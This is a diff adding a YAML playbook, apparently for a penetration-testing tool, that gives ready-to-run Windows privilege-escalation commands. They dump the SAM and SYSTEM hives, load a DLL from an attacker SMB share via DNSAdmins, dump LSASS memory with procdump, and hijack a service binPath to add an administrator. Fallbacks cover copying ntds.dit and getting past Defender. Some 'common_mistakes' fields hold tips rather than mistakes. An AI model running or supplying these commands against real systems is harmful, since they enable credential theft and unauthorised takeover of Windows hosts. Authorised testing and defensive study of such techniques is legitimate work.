@@ -1,0 +1,70 @@
+id: win-priv-groups
+name: Windows Privileged Groups & Token Exploitation
+category: privesc
+description: 'Methodology for escalating privileges via specialized Windows built-in groups and user rights: Backup Operators, DNSAdmins, Server Operators, Print Operators, and SeDebugPrivilege.'
+requires_shell: true
+target_os: windows
+port_triggers: []
+tags:
+  - windows
+  - privesc
+  - backup-operators
+  - dnsadmins
+  - sedebug
+  - tokens
+steps:
+  - id: win-backup-operators-sam
+    title: Backup Operators / SeBackupPrivilege SAM & SYSTEM Dump
+    phase: exploitation
+    purpose: Abuse `SeBackupPrivilege` / `Backup Operators` group membership to read locked registry hives (SAM, SYSTEM) or copy `ntds.dit` without administrative locks.
+    command: reg save HKLM\SAM C:\Windows\Temp\sam.hive /y && reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y
+    expected_output:
+      - The operation completed successfully.
+    common_mistakes:
+      - Download `sam.hive` and `system.hive` to Kali and dump with `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`.
+    if_success: Local Administrator NTLM hashes extracted! Use Pass-the-Hash to login.
+    if_failure: If on Domain Controller, use `diskshadow` or `robocopy /b` to copy `C:\Windows\NTDS\ntds.dit`.
+    references:
+      - https://lolbas-project.github.io/
+  - id: win-dnsadmins-dll
+    title: DNSAdmins Group ServerLevelPluginDll Injection
+    phase: exploitation
+    purpose: If member of `DNSAdmins` group, configure the Microsoft DNS Server service to load a malicious plugin DLL from your SMB share and restart DNS as SYSTEM.
+    command: dnscmd.exe {{TARGET}} /config /serverlevelplugindll \\{{LHOST|10.10.14.2}}\share\plugin.dll && sc.exe \\{{TARGET}} stop DNS && sc.exe \\{{TARGET}} start DNS
+    expected_output:
+      - Registry property serverlevelplugindll successfully reset.
+      - 'SERVICE_NAME: DNS | STATE: RUNNING'
+    common_mistakes:
+      - Host payload DLL on an unauthenticated SMB share (e.g. `impacket-smbserver share /tmp -smb2support`).
+    if_success: DNS Server restarted and loaded your DLL as NT AUTHORITY\SYSTEM!
+    if_failure: Access denied stopping DNS. Server might reboot on schedule or wait for admin.
+    references:
+      - https://lolbas-project.github.io/
+  - id: win-sedebug-lsass
+    title: SeDebugPrivilege Direct LSASS Memory Dump
+    phase: exploitation
+    purpose: Use `SeDebugPrivilege` to attach to the `lsass.exe` process and dump its memory for offline plaintext password and NTLM extraction.
+    command: procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
+    expected_output:
+      - '[+] Dumping process 648 (lsass.exe)...'
+      - '[+] Dump count reached: Dump 1 complete.'
+    common_mistakes:
+      - On Kali, parse the dump with `pypykatz lsa minidump lsass.dmp`.
+    if_success: LSASS dumped! Extracted cleartext passwords and Kerberos tickets.
+    if_failure: Windows Defender or PPL (Protected Process Light) blocking LSASS access. Use Task Manager GUI dump or Nanodump.
+    references:
+      - https://lolbas-project.github.io/
+  - id: win-server-operators-service
+    title: Server Operators Service Reconfiguration
+    phase: exploitation
+    purpose: Members of `Server Operators` can modify and restart system services; reconfigure a service `binPath` to add your user to Local Administrators.
+    command: sc.exe config AppReadiness binPath= "cmd.exe /c net localgroup Administrators {{USERNAME}} /add" && sc.exe start AppReadiness
+    expected_output:
+      - '[SC] ChangeServiceConfig SUCCESS'
+      - '[SC] StartService SUCCESS'
+    common_mistakes:
+      - Put spaces after `binPath=` (e.g. `binPath= "..."`).
+    if_success: User added to Administrators! Open new shell with administrative privileges.
+    if_failure: Service disabled. Try alternate services like `Fax`, `Spooler`, or `WerSvc`.
+    references:
+      - https://lolbas-project.github.io/
